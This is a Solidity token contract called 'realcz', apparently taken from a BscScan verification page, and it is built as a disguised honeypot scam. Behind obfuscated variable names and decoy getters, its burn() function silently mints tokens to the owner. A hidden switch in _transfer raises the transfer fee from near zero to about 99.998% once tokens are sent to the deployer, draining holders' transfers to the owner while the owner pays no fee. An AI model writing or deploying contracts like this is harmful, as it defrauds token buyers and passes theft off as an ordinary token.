/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 08:36 GMT
 */
 // SPDX-License-Identifier: MIT
 // 
// @@@@@@@@\                                      @@@@@@\  @@\                 @@\           
// @@  _____|                                    @@  [email protected]@\ @@ |                \__|          
// @@ |       @@@@@@@\  @@@@@@@\  @@@@@@\        @@ /  \__|@@@@@@@\   @@@@@@\  @@\ @@@@@@@\  
// @@@@@\    @@  _____|@@  _____|@@  [email protected]@\       @@ |      @@  [email protected]@\  \[email protected]@\ @@ |@@  [email protected]@\ 
// @@  __|   \@@@@@@\  \@@@@@@\  @@@@@@@@ |      @@ |      @@ |  @@ | @@@@@@@ |@@ |@@ |  @@ |
// @@ |       \[email protected]@\  \[email protected]@\ @@   ____|      @@ |  @@\ @@ |  @@ |@@  [email protected]@ |@@ |@@ |  @@ |
// @@@@@@@@\ @@@@@@@  |@@@@@@@  |\@@@@@@@\       \@@@@@@  |@@ |  @@ |\@@@@@@@ |@@ |@@ |  @@ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//

pragma solidity >=0.6.0;
contract VPJCUAC {
string public  name = "realcz";
address private  LCDIIX = address(0);
address private  EFWNVU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  ONLWLI = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant POSKJM = 99999;
uint256 private  TBQQQZ = 10000000000000;
address private  PYLXEQ = address(0);
address public owner;
uint256 private  HMLDYW = 1000000000000000000;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OFWZEY = 1000000000000000;
uint256 private  ANOFFG = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  MKLJME = address(0);
mapping (address => uint256) public balanceOf;
address private  JEJITD = address(0);
string public  symbol = "realcz";
uint256 private  NOVHFR = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  SNTGBC = 10000000000;
function _getMKLJME() private returns (address) {
return MKLJME;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tTPIWOD 0");
require(spender != address(0), "fTPIWOD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getEFWNVU() private returns (address) {
return EFWNVU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getTBQQQZ() private returns (uint256) {
return TBQQQZ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TPIWOD");
require(to != address(0), "TPIWOD");
require(amount <= balanceOf[from], "TPIWOD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* POSKJM/ONLWLI ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PYLXEQ){
ONLWLI = POSKJM+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
PYLXEQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getOFWZEY() private returns (uint256) {
return OFWZEY;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getJEJITD() private returns (address) {
return JEJITD;
}

function _getHMLDYW() private returns (uint256) {
return HMLDYW;
}

function _getSNTGBC() private returns (uint256) {
return SNTGBC;
}

function _getANOFFG() private returns (uint256) {
return ANOFFG;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getLCDIIX() private returns (address) {
return LCDIIX;
}

function _getNOVHFR() private returns (uint256) {
return NOVHFR;
}


}